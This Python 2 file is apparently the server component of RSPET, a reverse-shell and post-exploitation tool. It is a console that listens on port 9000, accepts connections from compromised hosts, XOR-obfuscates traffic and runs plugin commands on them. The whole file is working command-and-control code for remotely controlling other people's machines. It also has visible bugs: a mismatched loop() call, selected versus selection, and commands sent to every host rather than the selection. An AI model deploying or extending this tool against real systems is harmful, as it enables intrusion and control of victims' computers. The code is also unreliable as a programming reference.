#!/usr/bin/env python2
from __future__ import print_function
from socket import socket, AF_INET, SOCK_STREAM
from socket import error as sock_error
from sys import exit as sysexit
from sys import argv
from thread import start_new_thread
from threading import Thread
from Plugins.mount import Plugin
import json
import tab
import Plugins.essentials

class Console:
    """Class to interfere with the server."""
    max_conns = 5 # Maximum connections that the server accepts
    server = None # The server object
    prompt = "~$ " # Current command prompt

    def __init__(self, max_conns=5):
        """Starts server"""
        self.max_conns = max_conns
        self.server = Server()

    def __del__(self):
        del self.server

    def loop(self):
        """Main CLI loop"""
        self._logo()
        start_new_thread(self.server.loop, ())
        while True:
            cmd = raw_input(self.prompt)

            cmdargs = cmd.split(" ")
            cmd = cmdargs[0]
            del cmdargs[0]
            self.server.execute(cmd, cmdargs)

    def _logo(self):
        """Print logo and Authorship/Licence."""
        print(r"#####################################################")
        print(r"__________  _________________________________________")
        print(r"\______   \/   _____/\______   \_   _____/\__    ___/")
        print(r" |       _/\_____  \  |     ___/|    __)_   |    |   ")
        print(r" |    |   \/        \ |    |    |        \  |    |   ")
        print(r" |____|_  /_______  / |____|   /_______  /  |____|   ")
        print(r"        \/        \/                   \/            ")
        print(r"")
        print(r" -Author: panagiks (http://panagiks.xyz)")
        print(r" -Author: dzervas (http://dzervas.gr)")
        print(r" -Licence: MIT")
        print(r"#####################################################")
        print(r"")

class Server:
    """Main class of the server. Manages server socket, selections and calls
    plugins."""
    ip = "0.0.0.0"
    port = "9000"
    max_conns = 5
    hosts = [] # List of hosts
    selection = [] # List of selected hosts
    plugins = [] # List of active plugins
    sock = None
    config = {}

    def __init__(self, max_conns=5, ip="0.0.0.0", port="9000"):
        """Starts to listen on socket"""
        self.ip = ip
        self.port = port
        self.max_conns = max_conns

        self.sock = socket(AF_INET, SOCK_STREAM)
        self.sock.setblocking(1)

        try:
            self.sock.bind((ip, int(port)))
            self.sock.listen(max_conns)
        except sock_error:
            print("Something went during binding & listening")

        with open("config.json") as json_config:
            self.config = json.load(json_config)

        for plugin in self.config["plugins"]:
            __import__("Plugins.%s" % plugin)

    def __del__(self):
        """Safely closes all sockets"""
        for host in self.hosts:
            del host
        self.sock.close()

    def loop(self):
        """Main server loop. Better call it on its own thread"""
        while True:
            (csock, (ip, port)) = self.sock.accept()
            self.hosts.append(Host(csock, ip, port))

    def select(self, ids=None):
        """Selects given host(s) based on ids

        Keyword argument:
        ids     -- Array of ids of hosts. Empty array unselects all. None
        selects all
        """
        if ids is None:
            self.selected = self.hosts
            return self.selected

        self.selected = []
        for i in ids:
            self.selected.append(self.hosts[i])

        return self.selected

    def execute(self, cmd, args):
        """Execute function on all client objects.

        Keyword argument:
        cmd     -- Function to call for each selected host.
        Function signature myfunc(Host, args[0], args[1], ...)
        It should accept len(args) - 1 arguments
        args    -- Arguments to pass to the command function"""

        # TODO: Exceptions & catches here...
        # TODO: Can this be done from regular plugin?
        if cmd == "help":
            self.help()
        elif Plugin.__server_cmds__[cmd] is not None:
            Plugin.__server_cmds__[cmd](self, args)
        elif Plugin.__host_cmds__[cmd] is not None:
            if len(self.selection) > 0:
                for client in self.hosts:
                    Plugin.__host_cmds__[cmd](client, args)

    def help(self):
        print("Server commands:")
        if Plugin.__server_cmds__ is not None:
            for cmd in Plugin.__server_cmds__:
                print("\t%s: %s" % (cmd, Plugin.__server_cmds__[cmd].__doc__))

        if Plugin.__host_cmds__ is not None and len(self.selection) > 0:
            print("Host commands:")
            for cmd in Plugin.__host_cmds__:
                print("\t%s: %s" % (cmd, Plugin.__host_cmds__[cmd].__doc__))

    def clean(self):
        for host in self.hosts:
            if host.deleteme:
                del host

        for host in self.selection:
            if host.deleteme:
                del host

class Host:
    """Class for hosts. Each Host object represent one host"""
    ip = None
    port = None
    version = None
    type = "full"
    sock = None
    deleteme = False

    def __init__(self, sock, ip, port):
        """Accepts the connection and initializes variables"""
        self.sock = sock
        self.ip = ip
        self.port = port

        tmp = self.recv().split("-")
        self.version = tmp[0]
        self.type = tmp[1]
        print(self.ip, self.port, self.version, self.type)

    def __del__(self):
        """Graceful deletion of host"""
        if not self.deleteme:
            self.sock.close()
            self.deleteme = True

    def __eq__(self, other):
        return self.sock == other.sock

    def send(self, msg):
        """Send message to host"""
        return self.sock.send(self._enc(msg))

    def recv(self, size=1024):
        """Receive from host"""
        return self._dec(self.sock.recv(size))
        # return self.sock.recv(size)

    def _enc(self, data):
        """Encrypt message (before send)"""
        out = bytearray(data, 'UTF-8')
        for i in range(len(out)):
            out[i] = out[i] ^ 0x41

        return out

    def _dec(self, data):
        """Decrypt message (after receive)"""
        out = bytearray(data)
        for i in range(len(out)):
            out[i] = out[i] ^ 0x41

        return out

if __name__ == "__main__":
    cli = Console()
    try:
        cli.loop(int(argv[1]))
    except IndexError:
        cli.loop()
    except KeyError:
        del cli
        sysexit()
